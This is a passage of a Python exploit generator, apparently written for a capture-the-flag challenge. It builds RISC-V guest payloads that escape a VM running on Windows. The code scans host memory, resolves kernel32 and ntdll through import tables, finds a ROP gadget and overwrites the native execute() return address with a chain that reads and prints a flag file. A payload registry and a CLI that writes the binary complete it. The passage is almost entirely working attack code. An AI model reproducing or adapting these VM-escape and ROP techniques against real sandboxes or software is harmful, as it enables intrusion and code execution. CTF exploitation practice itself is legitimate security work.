    a.emit(slli("t3", "t2", 48))
    a.emit(srli("t3", "t3", 48))
    a.extend(li32("t4", 0x1000))
    a.branch(bltu, "t3", "t4", "find_ret_outer_next")

    a.emit(addi("t5", "t2", 0))
    a.emit(srli("t3", "t2", 12))
    a.emit(slli("t3", "t3", 12))
    a.emit(sub("t3", "t2", "t3"))
    a.extend(li32("t4", 0x1000))
    a.emit(sub("t6", "t4", "t3"))
    a.emit(srli("t6", "t6", 3))
    a.label("find_ret_inner")
    a.emit(ld("a6", "t5", 0))
    a.branch(bne, "a6", "s3", "find_ret_inner_next")
    a.emit(ld("t4", "t5", -8))
    a.branch(bne, "t4", ctx, "find_ret_inner_next")
    emit_add_const(a, "t4", ctx, 0x110)
    a.emit(ld("t3", "t5", -24))
    a.branch(bne, "t3", "t4", "find_ret_inner_next")
    a.emit(addi(out, "t5", 0))
    a.branch(beq, "zero", "zero", "find_ret_done")
    a.label("find_ret_inner_next")
    a.emit(addi("t5", "t5", 8))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "find_ret_inner")

    a.label("find_ret_outer_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "find_ret_outer")
    a.label("find_ret_done")


def emit_find_large_module(a, out="s2", ctx="s1"):
    a.extend([auipc(ctx, 0), addi(ctx, ctx, -0x110)])
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", ctx, "t0"))
    a.extend(li32("t1", 0x18000 // 8))
    a.label("large_mod_loop")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 44))
    a.emit(addi("t4", "zero", 7))
    a.branch(bne, "t3", "t4", "large_mod_next")
    a.emit(srli("t3", "t2", 12))
    a.emit(slli("t3", "t3", 12))
    a.branch(bne, "t3", "t2", "large_mod_next")
    a.emit(ld("t5", "t0", -8))
    emit_add_const(a, "t5", "t5", 0x1000)
    a.branch(beq, "t5", "t2", "large_mod_next")
    a.emit(ld("t5", "t0", 8))
    emit_add_const(a, "t3", "t2", 0x1000)
    a.branch(beq, "t5", "t3", "large_mod_next")
    a.emit(addi("t5", "t0", 8))
    a.extend(li32("t6", 0x1000 // 8))
    a.label("large_dup_loop")
    a.emit(ld("t3", "t5", 0))
    a.branch(beq, "t3", "t2", "large_dup_ok")
    a.emit(addi("t5", "t5", 8))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "large_dup_loop")
    a.branch(beq, "zero", "zero", "large_mod_next")
    a.label("large_dup_ok")
    a.emit(lhu("t3", "t2", 0))
    a.extend(li32("t4", 0x5a4d))
    a.branch(bne, "t3", "t4", "large_mod_next")
    a.emit(lwu("t3", "t2", 0x3c))
    a.extend(li32("t4", 0x1000))
    a.branch(bgeu, "t3", "t4", "large_mod_next")
    a.emit(add("t5", "t2", "t3"))
    a.emit(lwu("t3", "t5", 0))
    a.extend(li32("t4", 0x4550))
    a.branch(bne, "t3", "t4", "large_mod_next")
    a.emit(lwu("t3", "t5", 0x50))
    a.extend(li32("t4", 0x100000))
    a.branch(bltu, "t3", "t4", "large_mod_next")
    a.emit(addi(out, "t2", 0))
    a.branch(beq, "zero", "zero", "large_mod_done")
    a.label("large_mod_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "large_mod_loop")
    a.emit(addi(out, "zero", 0))
    a.label("large_mod_done")


def p_scan_api_gadgets():
    a = Asm()
    emit_find_main_base(a)
    a.extend(sys_print_hex("s0"))
    a.extend(sys_nl())
    emit_iat_addr(a, "t0", "s0", 0x2020)
    a.emit(ld("a0", "t0", 0))
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())
    emit_find_module_base_from_ptr(a, "a0", "s2")
    emit_module_end(a, "s2", "s3")
    a.extend(sys_print_hex("s2"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("s3"))
    a.extend(sys_nl())
    emit_scan_api_gadgets(a)
    for reg in ("s5", "s6", "s7", "s8", "s9", "s10"):
        a.extend(sys_print_hex(reg))
        a.extend(sys_nl())
    a.extend(sys_exit())
    return a.finish()


def p_scan_large_module_gadgets():
    a = Asm()
    emit_find_main_base(a)
    a.extend(sys_print_hex("s0"))
    a.extend(sys_nl())
    emit_find_large_module(a, "s2", "s1")
    emit_module_end(a, "s2", "s3")
    a.extend(sys_print_hex("s2"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("s3"))
    a.extend(sys_nl())
    emit_scan_api_gadgets(a)
    for reg in ("s5", "s6", "s7", "s8", "s9", "s10"):
        a.extend(sys_print_hex(reg))
        a.extend(sys_nl())
    a.extend(sys_exit())
    return a.finish()


def build_final_exploit(path_text):
    a = Asm()

    # s0 = main module base, s1 = current VM context.
    emit_find_main_base(a, out="s0", ctx="s1")
    a.branch(beq, "s0", "zero", "final_clean_exit")

    # s4 = stack slot containing execute()'s return address back into main.
    emit_find_execute_ret_slot(a, main_base="s0", ctx="s1", out="s4")
    a.branch(beq, "s4", "zero", "final_clean_exit")

    # Keep all synthetic data inside the zeroed VM heap allocation.
    emit_add_const(a, "s9", "s1", 0x5000)   # UTF-16 path buffer
    emit_add_const(a, "s8", "s1", 0x6000)   # print VM context
    emit_add_const(a, "s7", "s1", 0x8000)   # file-read VM context
    emit_add_const(a, "s10", "s7", 0x110)   # flag buffer, where main reads payload data

    # Resolve kernel32 from CreateFileW's IAT entry, then derive ntdll and a
    # minimal pop rcx; ret gadget for the final clean process exit.
    emit_iat_addr(a, "t0", "s0", 0x2020)
    a.emit(ld("a0", "t0", 0))
    emit_find_module_base_from_ptr(a, "a0", "s2", tag="k32_final")
    a.branch(beq, "s2", "zero", "final_clean_exit")
    emit_find_ntdll_and_exitproc_from_kernel32(a, k32_base="s2", ntdll_out="s3", exit_out="s6")
    a.branch(beq, "s3", "zero", "final_clean_exit")
    emit_find_pop_rcx(a, ntdll_base="s3", out="s5")
    a.branch(beq, "s5", "zero", "final_clean_exit")
    a.branch(beq, "s6", "zero", "final_clean_exit")

    # Write the UTF-16 path consumed by CreateFileW in the native main.
    path = path_text.encode("utf-16le") + b"\x00\x00"
    emit_write_bytes(a, "s9", path)

    # Fake context F: main+0x1c37 treats [rdi+8] as argv[1], reads that file
    # into [rbx+0x110], then calls execute(rbx).
    a.emit(sd("s9", "s7", 8))

    # Fake context P: execute(P) prints the flag buffer via syscall 100.
    a.la("t0", "print_code")
    a.emit(sd("t0", "s8", 0))
    a.emit(sd("s10", "s8", 0x60))  # guest a0
    a.emit(ld("t0", "s1", 0x20))
    a.emit(sd("t0", "s8", 0x20))   # guest sp, mostly unused by print_code

    # Overwrite execute()'s saved nonvolatile registers and return address.
    # execute epilogue restores rdi from [ret-0x20] and rbx from [ret-0x8].
    a.emit(sd("s7", "s4", -0x20))
    a.emit(sd("s7", "s4", -0x08))
    emit_add_const(a, "t0", "s0", 0x1c37)
    a.emit(sd("t0", "s4", 0))

    # When the reused main reader returns, its epilogue pivots through the
    # normal caller stack at ret_slot+8. Layout below starts at ret_slot.
    emit_add_const(a, "t0", "s0", 0x1139)  # plain ret for stack alignment
    emit_add_const(a, "t1", "s0", 0x1000)  # execute
    a.emit(sd("zero", "s4", 0x48))         # pop rdi filler
    a.emit(sd("s5", "s4", 0x50))           # pop rcx; ret
    a.emit(sd("s8", "s4", 0x58))           # rcx = print context
    a.emit(sd("t0", "s4", 0x60))           # ret-align gadget
    a.emit(sd("t1", "s4", 0x68))           # execute(P)
    a.emit(sd("s5", "s4", 0x70))           # pop rcx; ret
    a.emit(sd("zero", "s4", 0x78))         # rcx = 0
    a.emit(sd("t0", "s4", 0x80))           # align before ntdll entry
    a.emit(sd("s6", "s4", 0x88))           # RtlExitUserProcess(0)

    # Leave the guest cleanly; the native execute() return path is now hijacked.
    a.extend(sys_exit())

    a.label("final_clean_exit")
    a.extend(sys_exit())

    a.label("print_code")
    a.extend(sys_print_str("a0"))
    a.extend(sys_exit())
    return a.finish()


def p_final_exploit():
    return build_final_exploit("C:\\chall\\flag.txt")


def p_local_exploit():
    return build_final_exploit("flag.txt")


def p_debug_final_state():
    a = Asm()
    emit_find_main_base(a, out="s0", ctx="s1")
    emit_find_execute_ret_slot(a, main_base="s0", ctx="s1", out="s4")

    a.extend(sys_print_hex("s0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("s4"))
    a.extend(sys_nl())

    emit_iat_addr(a, "t0", "s0", 0x2020)
    a.emit(ld("a0", "t0", 0))
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())

    emit_find_module_base_from_ptr(a, "a0", "s2", tag="k32_debug_final")
    a.extend(sys_print_hex("s2"))
    a.extend(sys_nl())
    a.branch(beq, "s2", "zero", "debug_final_done")

    emit_find_ntdll_and_exitproc_from_kernel32(a, k32_base="s2", ntdll_out="s3", exit_out="s6")
    a.extend(sys_print_hex("s3"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("s6"))
    a.extend(sys_nl())
    a.branch(beq, "s3", "zero", "debug_final_done")

    emit_find_pop_rcx(a, ntdll_base="s3", out="s5")
    a.extend(sys_print_hex("s5"))
    a.extend(sys_nl())

    a.label("debug_final_done")
    a.extend(sys_exit())
    return a.finish()


def p_debug_k32_imports():
    a = Asm()
    emit_find_main_base(a, out="s0", ctx="s1")
    emit_iat_addr(a, "t0", "s0", 0x2020)
    a.emit(ld("a0", "t0", 0))
    emit_find_module_base_from_ptr(a, "a0", "s2", tag="k32_import_dbg")
    a.extend(sys_print_hex("s0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("s2"))
    a.extend(sys_nl())

    a.emit(lwu("t0", "s2", 0x3c))
    a.emit(add("t1", "s2", "t0"))
    a.emit(lwu("t2", "t1", 0x90))
    a.emit(add("t2", "s2", "t2"))
    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.extend(li32("t6", 128))
    a.label("k32_imp_dbg_loop")
    a.emit(lwu("t3", "t2", 12))
    a.branch(beq, "t3", "zero", "k32_imp_dbg_done")
    a.emit(add("t4", "s2", "t3"))
    a.emit(lwu("t5", "t4", 0))
    a.extend(li32("t0", le_const(b"ntdl")))
    a.branch(bne, "t5", "t0", "k32_imp_dbg_next")
    a.emit(lwu("t5", "t4", 4))
    a.extend(li32("t0", le_const(b"l.dl")))
    a.branch(bne, "t5", "t0", "k32_imp_dbg_next")
    a.emit(lbu("t5", "t4", 8))
    a.emit(addi("t0", "zero", ord("l")))
    a.branch(bne, "t5", "t0", "k32_imp_dbg_next")

    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.emit(lwu("a0", "t2", 0))
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())
    a.emit(lwu("a0", "t2", 16))
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())
    a.emit(lwu("t3", "t2", 16))
    a.emit(add("t4", "s2", "t3"))
    for off in range(0, 0x28, 8):
        a.emit(ld("a0", "t4", off))
        a.extend(sys_print_hex("a0"))
        a.extend(sys_nl())
    a.emit(lwu("t3", "t2", 0))
    a.emit(add("t4", "s2", "t3"))
    for off in range(0, 0x28, 8):
        a.emit(ld("a0", "t4", off))
        a.extend(sys_print_hex("a0"))
        a.extend(sys_nl())
    a.branch(beq, "zero", "zero", "k32_imp_dbg_done")

    a.label("k32_imp_dbg_next")
    a.emit(addi("t2", "t2", 20))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "k32_imp_dbg_loop")
    a.label("k32_imp_dbg_done")
    a.extend(sys_exit())
    return a.finish()


def p_debug_ntdll_base_from_k32():
    a = Asm()
    emit_find_main_base(a, out="s0", ctx="s1")
    emit_iat_addr(a, "t0", "s0", 0x2020)
    a.emit(ld("a0", "t0", 0))
    emit_find_module_base_from_ptr(a, "a0", "s2", tag="k32_ntdll_base_dbg")

    a.emit(lwu("t0", "s2", 0x3c))
    a.emit(add("t1", "s2", "t0"))
    a.emit(lwu("t2", "t1", 0x90))
    a.emit(add("t2", "s2", "t2"))
    a.extend(li32("t6", 128))
    a.label("ntdll_base_dbg_imp_loop")
    a.emit(lwu("t3", "t2", 12))
    a.branch(beq, "t3", "zero", "ntdll_base_dbg_done")
    a.emit(add("t4", "s2", "t3"))
    a.emit(lwu("t5", "t4", 0))
    a.extend(li32("t0", le_const(b"ntdl")))
    a.branch(bne, "t5", "t0", "ntdll_base_dbg_next")
    a.emit(lwu("t5", "t4", 4))
    a.extend(li32("t0", le_const(b"l.dl")))
    a.branch(bne, "t5", "t0", "ntdll_base_dbg_next")
    a.emit(lbu("t5", "t4", 8))
    a.emit(addi("t0", "zero", ord("l")))
    a.branch(bne, "t5", "t0", "ntdll_base_dbg_next")
    a.emit(lwu("t3", "t2", 16))
    a.emit(add("t4", "s2", "t3"))
    a.emit(ld("a0", "t4", 0))
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())
    emit_find_module_base_from_ptr(a, "a0", "s3", tag="ntdll_only_dbg")
    a.extend(sys_print_hex("s3"))
    a.extend(sys_nl())
    a.branch(beq, "zero", "zero", "ntdll_base_dbg_done")
    a.label("ntdll_base_dbg_next")
    a.emit(addi("t2", "t2", 20))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "ntdll_base_dbg_imp_loop")
    a.label("ntdll_base_dbg_done")
    a.extend(sys_exit())
    return a.finish()


def p_debug_ntdll_thunks():
    a = Asm()
    emit_find_main_base(a, out="s0", ctx="s1")
    emit_iat_addr(a, "t0", "s0", 0x2020)
    a.emit(ld("a0", "t0", 0))
    emit_find_module_base_from_ptr(a, "a0", "s2", tag="k32_thunk_dbg")

    a.emit(lwu("t0", "s2", 0x3c))
    a.emit(add("t1", "s2", "t0"))
    a.emit(lwu("t2", "t1", 0x90))
    a.emit(add("t2", "s2", "t2"))
    a.extend(li32("t6", 128))
    a.label("thunk_dbg_imp_loop")
    a.emit(lwu("t3", "t2", 12))
    a.branch(beq, "t3", "zero", "thunk_dbg_done")
    a.emit(add("t4", "s2", "t3"))
    a.emit(lwu("t5", "t4", 0))
    a.extend(li32("t0", le_const(b"ntdl")))
    a.branch(bne, "t5", "t0", "thunk_dbg_next_desc")
    a.emit(lwu("t5", "t4", 4))
    a.extend(li32("t0", le_const(b"l.dl")))
    a.branch(bne, "t5", "t0", "thunk_dbg_next_desc")
    a.emit(lbu("t5", "t4", 8))
    a.emit(addi("t0", "zero", ord("l")))
    a.branch(bne, "t5", "t0", "thunk_dbg_next_desc")

    a.emit(lwu("t3", "t2", 0))
    a.emit(add("t5", "s2", "t3"))
    a.extend(li32("t6", 140))
    a.label("thunk_dbg_loop")
    a.emit(ld("t0", "t5", 0))
    a.branch(beq, "t0", "zero", "thunk_dbg_done")
    a.emit(add("t1", "s2", "t0"))
    a.extend(sys_print_hex("t0"))
    a.extend(sys_nl())
    a.emit(lwu("a0", "t1", 2))
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())
    a.emit(addi("t5", "t5", 8))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "thunk_dbg_loop")
    a.branch(beq, "zero", "zero", "thunk_dbg_done")

    a.label("thunk_dbg_next_desc")
    a.emit(addi("t2", "t2", 20))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "thunk_dbg_imp_loop")
    a.label("thunk_dbg_done")
    a.extend(sys_exit())
    return a.finish()


PAYLOADS = {
    "leak_pc": p_leak_pc,
    "read_image_base": p_read_image_base,
    "read_80000000": p_read_80000000,
    "heap_rw": p_heap_rw,
    "read_ctx": p_read_ctx,
    "scan_ctx": p_scan_ctx,
    "scan_kuser": p_scan_kuser,
    "loop": p_loop,
    "scan_heap_ptrs": p_scan_heap_ptrs,
    "find_base": p_find_base,
    "test_iat_write": p_test_iat_write,
    "scan_page_candidates": p_scan_page_candidates,
    "debug_deref_candidates": p_debug_deref_candidates,
    "scan_stack_like": p_scan_stack_like,
    "scan_low_ptrs": p_scan_low_ptrs,
    "scan_return_addrs": p_scan_return_addrs,
    "debug_return_scan": p_debug_return_scan,
    "scan_api_gadgets": p_scan_api_gadgets,
    "scan_large_module_gadgets": p_scan_large_module_gadgets,
    "final_exploit": p_final_exploit,
    "local_exploit": p_local_exploit,
    "debug_final_state": p_debug_final_state,
    "debug_k32_imports": p_debug_k32_imports,
    "debug_ntdll_base_from_k32": p_debug_ntdll_base_from_k32,
    "debug_ntdll_thunks": p_debug_ntdll_thunks,
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("name", choices=sorted(PAYLOADS))
    ap.add_argument("-o", "--output", default="payload.bin")
    ap.add_argument("--b64", action="store_true")
    args = ap.parse_args()
    data = PAYLOADS[args.name]()
    Path(args.output).write_bytes(data)
    print(f"wrote {args.output}: {len(data)} bytes")
    print("words:")
    for off in range(0, len(data), 4):
        print(f"  {off:04x}: {struct.unpack_from('<I', data, off)[0]:08x}")
    if args.b64:
        print(base64.b64encode(data).decode())


if __name__ == "__main__":
    main()
